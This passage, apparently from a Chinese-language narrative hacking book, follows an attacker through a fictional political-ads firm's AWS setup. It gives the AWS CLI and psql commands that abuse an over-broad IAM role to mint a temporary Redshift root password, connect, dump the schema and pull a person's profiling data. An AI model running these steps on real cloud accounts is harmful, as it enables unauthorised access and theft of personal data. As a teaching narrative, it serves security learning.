
`NodeType`: `ra3.16xlarge`,

`MasterUsername`: `root`

`DBName`: `datalake`,

`Endpoint`: {

  `Address`: `bi.cdc3ssq81c3x.eu-west-1.redshift.amazonaws.com`,

  `Port`: `5439`

}

`VpcSecurityGroupId`: `sg-9f3a64e4`, `sg-a53f61de`, `sg-042c4a3f80a7e262c`

--snip--

```
我们查看安全组，看看是否有可能阻止直接连接到数据库的过滤规则：
```

```
root@Point1:~/# aws ec2 describe-security-groups \
--group-ids sg-9f3a64e4 sg-a53f61de
"IpPermissions": [ {
  "ToPort": 5439,
  "IpProtocol": "tcp",
  "IpRanges": [
    { "CidrIp": "52.210.98.176/32" },
    { "CidrIp": "32.29.54.20/32" },
    { "CidrIp": "10.0.0.0/8" },
    { "CidrIp": "0.0.0.0/0" },
```
我有史以来最喜欢的 IP 范围：`0.0.0.0/0`。这个未过滤的 IP 范围可能只是作为临时访问授予，用于测试新的 SaaS 集成或运行一些查询……然而我们就在这里。公平地说，由于我们已经可以访问 GP 的网络，这对我们来说意义不大。损害已经造成。

Redshift 与 IAM 服务紧密耦合，因此我们不需要去寻找数据库的凭证。由于我们的 rundeck 角色附带了一个漂亮的 `redshift:*` 权限，我们只需为数据库上的任何用户账户（包括 `root`）创建一个临时密码：

```
root@Point1:~/# aws redshift get-cluster-credentials \
--db-user root \
--db-name datalake\
--cluster-identifier bi \
--duration-seconds 3600
```

```
"DbUser": "IAM:root",
"DbPassword": "AskFx8eXiOn1kMLKIxPHkvwfXoFSSewm5gAheaQYhTCokEe",
"Expiration": "2020-12-29T11:32:25.755Z"
```

凭借这些数据库凭证，只需下载 PostgreSQL 客户端并将其指向 Redshift 端点即可：

```
root@Point1:~/# apt install postgresql postgresql-contrib
root@Point1:~/# PGPASSWORD='AskFx8eXiOn1kMLKIx...' \
psql \
-h bi.cdc3ssq81c3x.eu-west-1.redshift.amazonaws.com \
-U root \
-d datalake \
-p 5439
-c "SELECT tablename, columnname FROM PG_TABLE_DEF where schemaname \
='public'" > list_tables_columns.txt
```

我们导出一份全面的表和列清单（存储在 `PG_TABLE_DEF` 表中），并迅速锁定有趣的数据：

```
root@Point1:~/# cat list_tables_columns.txt
profile, id
profile, name
profile, lastname
profile, social_id
--snip--
social, id
social, link
social, fb_likes
social, fb_interest
--snip--
taxonomy, segment_name
taxonomy, id
taxonomy, reach
taxonomy, provider
--snip--
interestgraph, id
interestgraph, influence_axis
interestgraph, action_axis
--snip--
```

没有什么能比得上一个好老式的 SQL 数据库，我们可以在其中尽情查询和连接数据！这个 Redshift 集群是几乎所有流入 Gretsch Politico 基础设施的数据输入的交汇点。

我们找到了与 MXR Ads 表现相关的数据，以及它对人们在线行为产生的影响。我们拥有他们的完整在线活动记录，包括他们访问过的每个带有与 GP 相关的 JavaScript 标签的网站列表，甚至还有那些天真到与 GP 的隐藏合作伙伴共享此类数据的人所关联的社交媒体资料。当然，我们还有从数据提供商那里购买的经典数据细分，以及他们所称的“相似受众细分”——也就是说，将人口 A 的兴趣投射到人口 B 上，因为它们共享某些共同属性，比如使用的设备、行为等等。

我们尝试构建一个 SQL 查询，将这些数据的大部分编译成单一输出，以便更清晰地可视化正在发生的事情：

```
SELECT p.gp_id, p.name, p.lastname, p.deviceType, p.last_loc,
LISTAGG(a.referer), s.link, LISTAGG(s.fb_interest),
LISTAGG(t.segment_name),
i.action_y, i.influence_x, i.impulse_z
FROM profile p
JOIN ads a on p.ads_id = a.id
JOIN social s on p.social_id= s.id
JOIN taxonomy t on p.segment_id = t.id
JOIN interestgraph i on p.graph_id = i.id
GROUP BY p.gp_id
LIMIT 2000
```

## 鼓点，请。准备好了吗？开始！这里有一位客户，Francis Dima：

```
p.gp_id: d41d8cd98f00b204e9800998ecf8427e
p.name: Dima
p.lastname: Francis
p.deviceType: iphone X
p.last_loc_x: 50.06.16.3.N
p.last_loc_y: 8.41.09.3.E
a.referer: www.okinawa.com/orderMeal,
transferwise.com/90537e4b29fb87fec18e451...,
aljazeera.com/news/hong-kong-protest...
s.link: https://www.facebook.com/dima.realworld.53301
s.fb_interest: rock, metoo, fight4Freedom, legalizeIt...
t.segment_name:politics_leaned_left,
politics_manifesto... rally,
health_medicine_average,
health_chronic_pain,...
i.influence_x: 60
i.action_y: 95
i.impulse_z: 15
--snip--
```

通过聚合几个追踪器，你能了解人们的种种事情。可怜的 Dima 与超过 160 个数据细分相关联，描述了他从政治活动到烹饪习惯和医疗历史的一切。我们拥有他访问过的最后 500 个完整 URL、他最后已知的地理位置、他充满点赞和兴趣的 Facebook 资料，最重要的是，一张人物地图列出了他的影响力、冲动程度和广告互动水平。有了这些信息，就想想 GP 要针对这个人——任何人——影响他们对无数极化主题的看法会有多容易……嗯……把民主卖给出价最高的人。

财务集群是另一个活生生的埃尔多拉多。不仅仅是交易数据，它包含了有关每个对 Gretsch Politico 服务表现出一点点兴趣的客户的每一点可能信息，以及他们订购的创意素材：

```
c.id: 357
c.name: IFR
c.address: Ruysdaelkade 51-HS
c.city: Amsterdam
c.revenue: 549879.13
c.creatives: s3://Gretsch-studio/IFR/9912575fe6a4av.mp4,...
c.contact: jan.vanurbin@udrc.com
p.funnels: mxads, instagram, facebook,...
click_rate: 0.013
real_visit: 0.004
--snip--
```
